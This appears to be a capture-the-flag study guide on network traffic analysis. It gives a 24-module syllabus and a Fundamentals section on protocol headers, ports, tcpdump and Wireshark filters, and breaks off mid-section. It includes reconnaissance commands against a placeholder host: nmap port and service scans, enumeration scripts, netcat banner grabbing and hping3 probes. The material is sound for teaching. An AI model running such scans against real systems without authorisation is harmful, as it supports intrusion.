# Syllabus

## Module 1: Fundamentals

- OSI Model & TCP/IP Stack
- Network Protocols Overview (TCP, UDP, ICMP)
- Packet Structure & Headers
- Common Ports & Services
- Network Traffic Flow Basics

## Module 2: Kali Linux Environment Setup

- Kali Linux Installation & Configuration
- Essential Network Tools Installation
- Interface Configuration & Management
- Virtual Lab Setup
- Tool Version Management

## Module 3: Traffic Capture Tools

- Wireshark Basics
- tcpdump Command-Line Capture
- tshark (Wireshark CLI)
- NetworkMiner
- netsniff-ng
- Capture Filters vs Display Filters

## Module 4: Wireshark Deep Dive

- Interface Navigation
- Display Filters Syntax
- Capture Filters (BPF)
- Protocol Dissection
- Follow Streams (TCP/UDP/HTTP)
- Statistics & Endpoints
- Coloring Rules
- Export Objects
- Time Display Formats

## Module 5: Protocol Analysis

- HTTP/HTTPS Traffic Analysis
- DNS Query/Response Analysis
- FTP Traffic & File Extraction
- SMTP/POP3/IMAP Email Analysis
- SSH Traffic Patterns
- Telnet Cleartext Analysis
- SMB/CIFS Traffic
- ICMP Analysis

## Module 6: File Carving & Extraction

- Binwalk for Embedded Files
- Foremost File Recovery
- Scalpel Carving
- Bulk_extractor
- NetworkMiner File Extraction
- Manual Stream Reconstruction
- File Signature Analysis

## Module 7: Encrypted Traffic Analysis

- TLS/SSL Handshake Analysis
- Certificate Inspection
- SSL/TLS Decryption Techniques
- RSA Key Import
- Pre-Master Secret Logging
- VPN Traffic Identification
- Encrypted Protocol Fingerprinting

## Module 8: Malicious Traffic Detection

- Port Scanning Detection
- C2 (Command & Control) Patterns
- Beaconing Analysis
- Exfiltration Detection
- Malware Communication Patterns
- Suspicious DNS Queries
- HTTP Anomalies

## Module 9: Wireless Traffic Analysis

- 802.11 Frame Types
- Aircrack-ng Suite
- Kismet Wireless Detection
- Wifite Automation
- WPA Handshake Capture
- Deauthentication Detection
- Evil Twin Identification

## Module 10: Advanced Filtering Techniques

- Complex Boolean Filters
- Regular Expression Filtering
- Macros & Filter Buttons
- Protocol-Specific Filters
- Temporal Filtering
- Statistical Filtering
- Custom Column Creation

## Module 11: Scripting & Automation

- Python Scapy Basics
- Packet Crafting
- PyShark Automation
- Bash Scripting for Analysis
- tshark Automation Scripts
- Zeek (Bro) Scripting
- Custom Tool Development

## Module 12: Log Analysis & Correlation

- Zeek (Bro) IDS Logs
- Suricata Rule Analysis
- Syslog Parsing
- JSON Log Processing
- PCAP to Log Conversion
- Timeline Creation
- Multi-Source Correlation

## Module 13: Steganography in Network Traffic

- Covert Channels
- ICMP Tunneling
- DNS Tunneling Detection
- HTTP Header Manipulation
- Timing-Based Covert Channels
- Protocol Misuse
- Data Hiding in Protocol Fields

## Module 14: CTF-Specific Techniques

- PCAP Challenge Approach
- Flag Format Recognition
- Common CTF Protocols
- Base64/Hex Encoding Detection
- XOR Pattern Recognition
- Password Cracking from Traffic
- Reconstructing Communications

## Module 15: Traffic Manipulation & Replay

- tcpreplay Basics
- Packet Editing with Scapy
- WireEdit/Hex Editing
- Traffic Generation
- Man-in-the-Middle Setup
- ARP Spoofing with arpspoof
- Ettercap MITM

## Module 16: USB & Hardware Traffic

- USB PCAP Analysis
- HID (Keyboard) Traffic Decoding
- Serial Communication Analysis
- Bluetooth Traffic (BTLE)
- USB Storage Forensics
- Hardware Protocol Reverse Engineering

## Module 17: Application Layer Analysis

- Web Application Traffic
- API Request/Response Analysis
- WebSocket Analysis
- Database Protocol Analysis (MySQL, PostgreSQL)
- RDP Traffic Analysis
- VNC Protocol Analysis
- Custom Protocol Identification

## Module 18: Data Exfiltration Scenarios

- File Transfer Detection
- Large Data Movement Patterns
- Compression Identification
- Encryption Pre-Transfer
- Staged Exfiltration
- Cloud Service Usage
- Peer-to-Peer Detection

## Module 19: Forensics & Evidence Handling

- PCAP Chain of Custody
- Hash Verification
- Timestamping & NTP
- Evidence Documentation
- Report Generation
- Legal Considerations
- Reproducible Analysis

## Module 20: Performance & Optimization

- Large PCAP Handling
- Memory Management
- Split/Merge PCAP Files
- Filtering Before Analysis
- Ring Buffer Captures
- Distributed Analysis
- Cloud Processing Options

## Module 21: Alternative Tools & Frameworks

- Brim Security Platform
- Moloch/Arkime
- Security Onion
- NetworkMiner vs Wireshark
- Snort Rule Creation
- Suricata Configuration
- Elastic Stack Integration

## Module 22: Reverse Engineering Network Protocols

- Unknown Protocol Analysis
- Pattern Recognition
- Field Boundary Identification
- Checksum Calculation
- Length Field Analysis
- State Machine Reconstruction
- Documentation Creation

## Module 23: CTF Challenge Types

- PCAP Analysis Challenges
- Network Forensics Scenarios
- Packet Injection Problems
- Traffic Generation Tasks
- Protocol Implementation
- Cryptographic Protocol Analysis
- Multi-Stage Network Challenges

## Module 24: Practice & Resources

- CTF Platform Navigation (HTB, THM, etc.)
- PCAP Challenge Repositories
- Practice Dataset Sources
- Community Resources
- Write-up Analysis
- Tool Documentation
- Continuous Learning Strategies

---

# Fundamentals

## OSI Model & TCP/IP Stack

### OSI Model Layers

**Layer 7 - Application Layer**

- Handles application-level protocols and data representation
- Protocols: HTTP, HTTPS, FTP, SMTP, DNS, SSH, Telnet
- CTF relevance: Protocol-specific vulnerabilities, application fingerprinting
- Data unit: Data/Message

**Layer 6 - Presentation Layer**

- Data translation, encryption, compression
- Character encoding (ASCII, Unicode)
- Format conversions (JPEG, GIF, MPEG)
- CTF relevance: Encryption weaknesses, encoding bypasses

**Layer 5 - Session Layer**

- Session establishment, maintenance, termination
- Authentication and authorization
- Session multiplexing
- CTF relevance: Session hijacking, token manipulation

**Layer 4 - Transport Layer**

- End-to-end communication and reliability
- Protocols: TCP, UDP, SCTP
- Port numbers (0-65535)
- Data unit: Segment (TCP) / Datagram (UDP)
- CTF relevance: Port scanning, connection manipulation, fragmentation attacks

**Layer 3 - Network Layer**

- Logical addressing and routing
- Protocols: IP, ICMP, IPsec
- Data unit: Packet
- CTF relevance: IP spoofing, routing attacks, traceroute analysis

**Layer 2 - Data Link Layer**

- Physical addressing (MAC addresses)
- Frame formatting and error detection
- Protocols: Ethernet, ARP, PPP
- Data unit: Frame
- CTF relevance: ARP poisoning, MAC spoofing, switch attacks

**Layer 1 - Physical Layer**

- Physical transmission medium
- Voltage, radio frequencies, cabling
- Data unit: Bit
- CTF relevance: Physical access attacks, cable tapping

### TCP/IP Model

**Four-layer practical implementation model:**

**Application Layer** (combines OSI Layers 5-7)

- All application protocols and services
- Direct user interaction point

**Transport Layer** (OSI Layer 4)

- TCP and UDP protocols
- Port-based service identification

**Internet Layer** (OSI Layer 3)

- IP addressing and routing
- ICMP for diagnostics

**Network Access Layer** (combines OSI Layers 1-2)

- Physical hardware and data link protocols
- ARP protocol operation

### Layer Interaction in Packet Analysis

When analyzing captured traffic in CTF scenarios:

```bash
# View all layer information
tcpdump -i eth0 -XX -vvv

# Layer 2 (Ethernet) headers
tcpdump -i eth0 -e

# Layer 3 (IP) headers with verbose output
tcpdump -i eth0 -vv 'ip'

# Layer 4 (TCP) flags and sequence numbers
tcpdump -i eth0 'tcp' -vv
```

## Network Protocols Overview

### TCP (Transmission Control Protocol)

**Characteristics:**

- Connection-oriented protocol
- Reliable delivery with acknowledgments
- Ordered packet delivery
- Flow control and congestion control
- Three-way handshake establishment
- Four-way termination

**TCP Header Structure (20-60 bytes):**

- Source Port (16 bits)
- Destination Port (16 bits)
- Sequence Number (32 bits)
- Acknowledgment Number (32 bits)
- Data Offset (4 bits)
- Reserved (3 bits)
- Flags (9 bits): NS, CWR, ECE, URG, ACK, PSH, RST, SYN, FIN
- Window Size (16 bits)
- Checksum (16 bits)
- Urgent Pointer (16 bits)
- Options (0-40 bytes)

**TCP Three-Way Handshake:**

```
Client → Server: SYN (SEQ=x)
Server → Client: SYN-ACK (SEQ=y, ACK=x+1)
Client → Server: ACK (SEQ=x+1, ACK=y+1)
```

**Analyzing TCP in Wireshark:**

```
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN packets only
tcp.flags.syn == 1 && tcp.flags.ack == 1  # SYN-ACK packets
tcp.flags.reset == 1                       # RST packets
tcp.analysis.retransmission                # Retransmitted packets
tcp.analysis.duplicate_ack                 # Duplicate ACKs
tcp.stream eq X                            # Follow specific TCP stream
```

**Common TCP Flags:**

- **SYN**: Synchronize, initiates connection
- **ACK**: Acknowledgment of received data
- **FIN**: Finish, terminates connection
- **RST**: Reset, aborts connection
- **PSH**: Push, immediate data delivery
- **URG**: Urgent, priority data

**CTF Application:**

- Identifying incomplete handshakes (port scanning indicators)
- Detecting TCP sequence prediction attacks
- Analyzing covert channels in TCP options
- Finding data exfiltration in established connections

### UDP (User Datagram Protocol)

**Characteristics:**

- Connectionless protocol
- No reliability guarantees
- No ordering guarantees
- Lower overhead than TCP
- Faster transmission
- No handshake mechanism

**UDP Header Structure (8 bytes):**

- Source Port (16 bits)
- Destination Port (16 bits)
- Length (16 bits)
- Checksum (16 bits)

**Analyzing UDP in Wireshark:**

```
udp.port == 53           # DNS traffic
udp.port == 67 or udp.port == 68  # DHCP traffic
udp.port == 69           # TFTP traffic
udp.port == 161          # SNMP traffic
udp.length > 1000        # Large UDP packets
```

**Common UDP-based Protocols:**

- DNS (port 53)
- DHCP (ports 67, 68)
- TFTP (port 69)
- SNMP (port 161)
- NTP (port 123)
- RADIUS (ports 1812, 1813)

**CTF Application:**

- DNS tunneling detection
- SNMP enumeration
- UDP flood identification
- Fragmented UDP payload reconstruction

### ICMP (Internet Control Message Protocol)

**Characteristics:**

- Network layer protocol (IP protocol number 1)
- Used for diagnostics and error reporting
- No port numbers
- Commonly used by ping and traceroute

**ICMP Message Types:**

**Type 0** - Echo Reply (ping response) **Type 3** - Destination Unreachable

- Code 0: Network unreachable
- Code 1: Host unreachable
- Code 2: Protocol unreachable
- Code 3: Port unreachable
- Code 4: Fragmentation needed but DF set

**Type 5** - Redirect Message

**Type 8** - Echo Request (ping)

**Type 11** - Time Exceeded

- Code 0: TTL expired in transit (traceroute)
- Code 1: Fragment reassembly time exceeded

**ICMP Header Structure:**

- Type (8 bits)
- Code (8 bits)
- Checksum (16 bits)
- Rest of Header (32 bits, varies by type)

**Analyzing ICMP in Wireshark:**

```
icmp.type == 8           # Echo requests
icmp.type == 0           # Echo replies
icmp.type == 3           # Destination unreachable
icmp.type == 11          # Time exceeded
icmp.code == 3           # Port unreachable messages
```

**Command-line Analysis:**

```bash
# Capture only ICMP traffic
tcpdump -i eth0 icmp

# Ping with specific packet size
ping -s 1000 target.com

# Traceroute analysis
traceroute -I target.com  # ICMP-based
traceroute -T target.com  # TCP-based

# Hping3 for custom ICMP
hping3 --icmp target.com
hping3 --icmp --icmptype 8 --icmpcode 0 target.com
```

**CTF Application:**

- ICMP tunneling detection
- Identifying network topology via ICMP responses
- Detecting ICMP-based covert channels
- Analyzing ping sweep reconnaissance
- Traceroute path analysis for network mapping

## Packet Structure & Headers

### Ethernet Frame Structure (Layer 2)

**Ethernet II Frame Format:**

```
[Preamble: 7 bytes][SFD: 1 byte][Destination MAC: 6 bytes][Source MAC: 6 bytes]
[EtherType: 2 bytes][Payload: 46-1500 bytes][FCS: 4 bytes]
```

**Key Fields:**

- **Preamble**: 7 bytes of alternating 1s and 0s for synchronization
- **Start Frame Delimiter (SFD)**: 10101011 signals frame start
- **Destination MAC**: 6-byte hardware address
- **Source MAC**: 6-byte hardware address
- **EtherType**: Protocol identifier (0x0800 = IPv4, 0x0806 = ARP, 0x86DD = IPv6)
- **Payload**: Actual data (46-1500 bytes)
- **Frame Check Sequence (FCS)**: CRC32 error detection

**Analyzing Ethernet Frames:**

```bash
# Display Ethernet headers
tcpdump -i eth0 -e

# Wireshark filter
eth.addr == 00:11:22:33:44:55
eth.dst == ff:ff:ff:ff:ff:ff  # Broadcast
eth.type == 0x0800              # IPv4
```

### IPv4 Packet Structure (Layer 3)

**IPv4 Header (20-60 bytes):**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if IHL > 5)                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Critical Fields:**

**Version** (4 bits): IP version (4 for IPv4)

**IHL - Internet Header Length** (4 bits): Header length in 32-bit words (minimum 5 = 20 bytes)

**Type of Service/DSCP** (8 bits): QoS and priority

**Total Length** (16 bits): Entire packet size (header + data), maximum 65,535 bytes

**Identification** (16 bits): Fragment identification number

**Flags** (3 bits):

- Bit 0: Reserved (must be 0)
- Bit 1: Don't Fragment (DF)
- Bit 2: More Fragments (MF)

**Fragment Offset** (13 bits): Position of fragment in original packet

**Time To Live (TTL)** (8 bits): Maximum hops, decremented by each router

**Protocol** (8 bits): Upper layer protocol

- 1 = ICMP
- 6 = TCP
- 17 = UDP

**Header Checksum** (16 bits): Error detection for header only

**Source/Destination Address** (32 bits each): IPv4 addresses

**Analyzing IPv4 Headers:**

```bash
# Display IP headers with tcpdump
tcpdump -i eth0 -n -vv 'ip'

# Wireshark filters
ip.addr == 192.168.1.100
ip.src == 10.0.0.1
ip.dst == 8.8.8.8
ip.ttl < 10                    # Low TTL packets
ip.flags.df == 1               # Don't Fragment set
ip.flags.mf == 1               # More Fragments set
ip.frag_offset > 0             # Fragmented packets
```

### TCP Segment Structure (Layer 4)

**TCP Header (20-60 bytes):**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E|U|A|P|R|S|F|                               |
| Offset| Res.  |W|C|R|C|S|S|Y|I|            Window             |
|       |       |R|E|G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if Data Offset > 5)               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Key TCP Fields:**

**Sequence Number** (32 bits): Byte position of data in stream (Initial Sequence Number randomized)

**Acknowledgment Number** (32 bits): Next expected byte from other side

**Data Offset** (4 bits): TCP header length in 32-bit words

**Control Flags** (9 bits):

- NS: ECN-nonce concealment protection
- CWR: Congestion Window Reduced
- ECE: ECN-Echo
- URG: Urgent pointer field significant
- ACK: Acknowledgment field significant
- PSH: Push function
- RST: Reset connection
- SYN: Synchronize sequence numbers
- FIN: No more data from sender

**Window Size** (16 bits): Receive window size for flow control

**TCP Options** (variable): MSS, Window Scale, SACK, Timestamps

**Analyzing TCP Segments:**

```bash
# Display TCP flags
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'

# Wireshark filters
tcp.port == 80
tcp.srcport == 443
tcp.dstport == 22
tcp.seq == 0                   # Initial sequence numbers
tcp.flags == 0x02              # SYN only
tcp.flags == 0x12              # SYN-ACK
tcp.flags == 0x10              # ACK only
tcp.flags == 0x04              # RST
tcp.flags == 0x01              # FIN
tcp.options.mss_val            # MSS value
tcp.window_size < 1000         # Small window sizes
```

### UDP Datagram Structure (Layer 4)

**UDP Header (8 bytes):**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            Length             |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          Data Payload                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**UDP Fields:**

- Simple 8-byte header
- Length includes header + data
- Checksum optional in IPv4 (mandatory in IPv6)
- No connection state maintained

## Common Ports & Services

### Well-Known Ports (0-1023)

**Web Services:**

- **80/TCP**: HTTP (Hypertext Transfer Protocol)
- **443/TCP**: HTTPS (HTTP over TLS/SSL)
- **8080/TCP**: HTTP alternate/proxy
- **8443/TCP**: HTTPS alternate

**File Transfer:**

- **20/TCP**: FTP data transfer
- **21/TCP**: FTP control
- **22/TCP**: SSH/SFTP (Secure Shell)
- **69/UDP**: TFTP (Trivial FTP)
- **989/TCP**: FTPS data
- **990/TCP**: FTPS control

**Email Services:**

- **25/TCP**: SMTP (Simple Mail Transfer Protocol)
- **110/TCP**: POP3 (Post Office Protocol)
- **143/TCP**: IMAP (Internet Message Access Protocol)
- **465/TCP**: SMTPS (SMTP over SSL)
- **587/TCP**: SMTP (submission)
- **993/TCP**: IMAPS (IMAP over SSL)
- **995/TCP**: POP3S (POP3 over SSL)

**Directory Services:**

- **389/TCP**: LDAP (Lightweight Directory Access Protocol)
- **636/TCP**: LDAPS (LDAP over SSL)
- **88/TCP/UDP**: Kerberos authentication

**Remote Access:**

- **23/TCP**: Telnet
- **22/TCP**: SSH
- **3389/TCP**: RDP (Remote Desktop Protocol)
- **5900/TCP**: VNC (Virtual Network Computing)

**DNS & Network Services:**

- **53/TCP/UDP**: DNS (Domain Name System)
- **67/UDP**: DHCP server
- **68/UDP**: DHCP client
- **123/UDP**: NTP (Network Time Protocol)
- **161/UDP**: SNMP (Simple Network Management Protocol)
- **162/UDP**: SNMP trap

**Database Services:**

- **1433/TCP**: Microsoft SQL Server
- **1521/TCP**: Oracle database
- **3306/TCP**: MySQL/MariaDB
- **5432/TCP**: PostgreSQL
- **6379/TCP**: Redis
- **27017/TCP**: MongoDB

**Windows Services:**

- **135/TCP**: Microsoft RPC
- **137/UDP**: NetBIOS Name Service
- **138/UDP**: NetBIOS Datagram Service
- **139/TCP**: NetBIOS Session Service
- **445/TCP**: SMB over TCP (Server Message Block)

**CTF-Relevant Services:**

- **79/TCP**: Finger protocol
- **111/TCP/UDP**: RPC portmapper
- **512-514/TCP**: Rexec, Rlogin, Rsh
- **2049/TCP/UDP**: NFS (Network File System)
- **6000-6063/TCP**: X11

### Port Scanning in CTF

**Identifying services:**

```bash
# Nmap service detection
nmap -sV -p- target.com

# Aggressive service detection
nmap -sV --version-intensity 9 -p 1-65535 target.com

# Banner grabbing with netcat
nc -vn target.com 21

# Banner grabbing with Nmap
nmap -sV --script=banner target.com

# Specific service scripts
nmap --script=http-enum -p 80,443 target.com
nmap --script=ftp-anon -p 21 target.com
nmap --script=smb-enum-shares -p 445 target.com
```

**Analyzing port traffic in Wireshark:**

```
tcp.port == 80 || tcp.port == 443    # Web traffic
tcp.port == 21 || tcp.port == 20     # FTP
tcp.port == 445 || tcp.port == 139   # SMB
tcp.port in {22 3389 23}             # Remote access
```

## Network Traffic Flow Basics

### Packet Capture Fundamentals

**Capture Interfaces:**

```bash
# List available interfaces
ifconfig
ip addr show
tcpdump -D

# Capture on specific interface
tcpdump -i eth0

# Capture on all interfaces (Linux)
tcpdump -i any

# Monitor mode for wireless (requires support)
airmon-ng start wlan0
```

**Basic Capture Commands:**

```bash
# Capture with full packet content
tcpdump -i eth0 -w capture.pcap

# Capture with verbosity
tcpdump -i eth0 -vv

# Capture with timestamps
tcpdump -i eth0 -tttt

# Capture with hex and ASCII output
tcpdump -i eth0 -XX

# Limit capture size
tcpdump -i eth0 -c 1000           # Capture 1000 packets
tcpdump -i eth0 -s 96             # Snap length 96 bytes
tcpdump -i eth0 -s 0              # Capture full packets
```

### Traffic Flow Analysis

**Connection Establishment Flow:**

```
1. Client initiates SYN to server:port
2. Server responds with SYN-ACK
3. Client confirms with ACK
4. Data exchange occurs
5. Connection termination (FIN/ACK or RST)
```

**Tracking Conversations:**

```bash
# Wireshark: Statistics > Conversations
# Shows endpoints, packets, bytes

# Wireshark: Statistics > Protocol Hierarchy
# Shows protocol distribution

# Follow TCP stream in Wireshark
Right-click packet > Follow > TCP Stream

# Extract TCP stream with tshark
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```

**Identifying Traffic Patterns:**

**Normal HTTP Request Flow:**

```
1. DNS query for domain (UDP/53)
2. DNS response with IP
3. TCP three-way handshake to port 80
4. HTTP GET request
5. HTTP 200 OK response
6. Data transfer
7. TCP connection termination
```

**Detecting Anomalies:**

```bash
# SYN flood detection
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'

# Port scan detection (many SYN packets)
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -nn

# ICMP flood
tcpdump -i eth0 icmp -c 100

# Large packet sizes (possible exfiltration)
tcpdump -i eth0 'greater 1000'
```

### Baseline vs Anomalous Traffic

**Establishing Baselines:**

- Normal connection rates
- Typical protocol distributions
- Expected service ports
- Standard packet sizes
- Regular timing patterns

**Anomaly Indicators:**

- Unusual ports for known services
- Unexpected protocols on standard ports
- Abnormal packet sizes
- High connection failure rates
- Traffic to suspicious IPs
- Encrypted traffic on non-standard ports
- Data exfiltration patterns (outbound bulk transfers)

**Statistical Analysis:**

```bash
# Protocol distribution
tshark -r capture.pcap -q -z io,phs

# Endpoint statistics
tshark -r capture.pcap -q -z endpoints,ip

# Conversation pairs
tshark -r capture.pcap -q -z conv,ip
```

### Traffic Filtering Essentials

**tcpdump BPF Syntax:**

```bash
# By host
tcpdump -i eth0 host 192.168.1.100
tcpdump -i eth0 src 192.168.1.100
tcpdump -i eth0 dst 192.168.1.100

# By network
tcpdump -i eth0 net 192.168.1.0/24

# By port
tcpdump -i eth0 port 80
tcpdump -i eth0 portrange 1-1024

# By protocol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp

# Combining filters
tcpdump -i eth0 'host 192.168.1.100 and port 80'
tcpdump -i eth0 'src 10.0.0.1 and (dst port 80 or dst port 443)'
tcpdump -i eth0 'tcp and not port 22'
```

**Wireshark Display Filters:**

```
ip.addr == 192.168.1.100
ip.src == 10.0.0.1 and tcp.port == 80
http.request.method == "POST"
dns.qry.name contains "example"
tcp.flags.syn == 1 and tcp.flags.ack == 0
frame.time_relative > 10
```

### Packet Flow Through Network Layers

**Encapsulation Process (Outbound):**

```
Application Layer: Data
    ↓
Transport Layer: [TCP/UDP Header][Data] = Segment/Datagram
    ↓
Network Layer: [IP Header][TCP/UDP Header][Data] = Packet
    ↓
Data Link Layer: [Ethernet Header][IP Header][TCP/UDP Header][Data][FCS] = Frame
    ↓
Physical Layer: Bits on wire
```

**Decapsulation Process (Inbound):**

```
Physical Layer: Receives bits
    ↓
Data Link Layer: Validates FCS, strips Ethernet header
    ↓
Network Layer: Processes IP header, routing decisions
    ↓
Transport Layer: Processes TCP/UDP, reassembles segments
    ↓
Application Layer: Delivers data to application
```

**Analyzing Layer Progression:**

```bash
# View complete encapsulation
tcpdump -i eth0 -XX -vvv

# tshark detailed layer breakdown
tshark -r capture.pcap -V -x

# Extract specific layer fields
tshark -r capture.pcap -T fields -e frame.number -e ip.src -e ip.dst -e tcp.port
```

### Traffic Flow States

**TCP Connection States:**

**LISTEN**: Server waiting for connection requests

**SYN-SENT**: Client sent SYN, waiting for SYN-ACK

**SYN-RECEIVED**: Server received SYN, sent SYN-ACK, waiting for ACK

**ESTABLISHED**: Connection active, data transfer occurring

**FIN-WAIT-1**: Local side initiated close, sent FIN

**FIN-WAIT-2**: Remote acknowledged FIN, waiting for remote FIN

**CLOSE-WAIT**: Remote initiated close, waiting for local application to close

**CLOSING**: Both sides closing simultaneously

**LAST-ACK**: Waiting for final ACK after sending FIN

**TIME-WAIT**: Waiting to ensure remote received ACK (2*MSL timeout)

**CLOSED**: Connection terminated

**Monitoring Connection States:**

```bash
# Linux netstat
netstat -antp

# ss (modern replacement)
ss -tanp

# Display only established
ss -tan state established

# Display specific states
ss -tan state syn-sent
ss -tan state time-wait

# Count connections by state
netstat -ant | awk '{print $6}' | sort | uniq -c
```

**Identifying State in Packet Captures:**

```
# Wireshark filters
tcp.flags.syn==1 && tcp.flags.ack==0    # SYN-SENT
tcp.flags.syn==1 && tcp.flags.ack==1    # SYN-RECEIVED
tcp.flags==0x018                         # ESTABLISHED (PSH,ACK)
tcp.flags.fin==1                         # FIN states
tcp.flags.reset==1                       # Abrupt termination
```

### Routing and Traffic Direction

**Traceroute Analysis:**

Understanding packet paths through networks is crucial for CTF network analysis.

```bash
# ICMP-based traceroute
traceroute target.com

# TCP-based traceroute (useful when ICMP blocked)
traceroute -T -p 80 target.com

# UDP-based (default Linux)
traceroute -U target.com

# Detailed with AS numbers
traceroute -A target.com

# hping3 for custom traceroute
hping3 --traceroute -S -p 80 target.com
```

**Analyzing Traceroute Results:**

- Each hop shows TTL decrement
- ICMP Time Exceeded messages reveal routers
- - - - indicates filtered hop or no response
- Asymmetric routing common (outbound ≠ inbound path)

**Packet TTL Analysis:**

```bash
# Identify OS by default TTL
# Linux/Unix: 64
# Windows: 128
# Cisco/Network devices: 255

# Wireshark filter for TTL
ip.ttl == 64
ip.ttl < 10               # Packets near expiration
ip.ttl > 200              # Likely network device
```

**CTF Application - TTL Manipulation Detection:**

```
Initial TTL guess = response TTL + hop count
If observed TTL doesn't match expected, possible spoofing or tunneling
```

### Bandwidth and Throughput Concepts

**Understanding Traffic Volume:**

**Bandwidth**: Maximum theoretical data rate (bits per second)

**Throughput**: Actual achieved data rate

**Goodput**: Application-level throughput (excludes protocol overhead)

**Measuring Traffic Rates:**

```bash
# iftop - real-time bandwidth monitor
iftop -i eth0

# nethogs - per-process bandwidth
nethogs eth0

# iperf3 - bandwidth testing
iperf3 -s                 # Server
iperf3 -c server_ip       # Client

# Wireshark: Statistics > I/O Graph
# Shows packets/bytes over time
```

**Calculating Throughput from Captures:**

```bash
# tshark IO statistics
tshark -r capture.pcap -q -z io,stat,1

# Calculate bits per second
capinfos capture.pcap

# Per-conversation bandwidth
tshark -r capture.pcap -q -z conv,tcp
```

### Flow Control and Windowing

**TCP Window Size:**

The TCP window size determines how much unacknowledged data can be in flight.

```
Throughput ≈ Window Size / RTT
```

**Analyzing TCP Windows:**

```bash
# Wireshark display
tcp.window_size_value

# Zero window conditions (receiver buffer full)
tcp.window_size == 0

# Window scaling option
tcp.options.wscale.shift

# Effective window = window_size × 2^(scale_factor)
```

**Window Analysis in CTF:**

- Small windows may indicate bandwidth constraints
- Zero windows suggest resource exhaustion
- Window scaling disabled may indicate old systems
- Abnormal window behavior can indicate covert channels

**TCP Flow Control Mechanisms:**

**Sliding Window Protocol:**

- Sender maintains send window
- Receiver advertises receive window
- Window slides as data acknowledged

**Congestion Control:**

- Slow start: Exponential growth
- Congestion avoidance: Linear growth
- Fast retransmit: Duplicate ACKs trigger retransmission
- Fast recovery: Reduce window, avoid slow start

```bash
# Detecting retransmissions
tcp.analysis.retransmission

# Duplicate ACKs
tcp.analysis.duplicate_ack

# Out-of-order segments
tcp.analysis.out_of_order
```

### Session Multiplexing

**Multiple Connections Simultaneously:**

Port numbers enable multiplexing of multiple sessions to same destination:

```
Client:45678 → Server:80 (Connection 1)
Client:45679 → Server:80 (Connection 2)
Client:45680 → Server:443 (Connection 3)
```

**Tracking Multiplexed Sessions:**

```bash
# Wireshark: Statistics > Conversations > TCP
# Shows all unique 5-tuples (src IP, src port, dst IP, dst port, protocol)

# tshark session counting
tshark -r capture.pcap -q -z conv,tcp | grep -c "←→"

# Display filter for specific session
ip.addr == 192.168.1.100 && ip.addr == 10.0.0.1 && tcp.port == 45678 && tcp.port == 80
```

**Stream Indexes in Wireshark:**

```
tcp.stream eq 0           # First TCP conversation
tcp.stream eq 1           # Second TCP conversation

# Extract all streams
for i in {0..100}; do
  tshark -r capture.pcap -Y "tcp.stream eq $i" -w stream_$i.pcap
done
```

### Fragmentation

**IP Fragmentation:**

When packets exceed MTU (Maximum Transmission Unit), they're fragmented.

**Standard MTUs:**

- Ethernet: 1500 bytes
